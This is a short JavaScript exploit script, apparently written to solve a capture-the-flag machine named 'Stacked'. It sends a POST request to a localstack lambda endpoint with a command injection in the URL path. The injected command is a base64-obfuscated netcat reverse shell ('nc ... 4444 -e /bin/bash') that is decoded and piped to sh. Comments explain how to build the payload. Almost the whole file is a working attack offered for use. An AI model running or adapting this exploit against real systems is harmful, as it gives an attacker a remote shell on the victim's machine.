// Doing POST request to localstack of Stacked machine.
var xhr = new XMLHttpRequest();
// the command injection payload is 'nc 10.10.x.x 4444 -e /bin/bash' 
// base64 your payload
// then url encode of "echo <base64> | base64 -d | sh"
//
//
// The finish payload would be "echo%20bmMgMTAuMTAuMTQuMjUgNDQ0NCAtZSAvYmluL2Jhc2g=%20%7C%20base64%20-d%20%7C%20sh"
// and put the payload after the semicolon
var target = 'http://localhost:8080/lambda/test;echo%20bmMgMTAuMTAuMTQuMTY1IDQ0NDQgLWUgL2Jpbi9iYXNoCg==%20%7C%20base64%20-d%20%7C%20sh/code'

xhr.open("POST", target, false);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({ "awsEnvironment": "nothing" }));
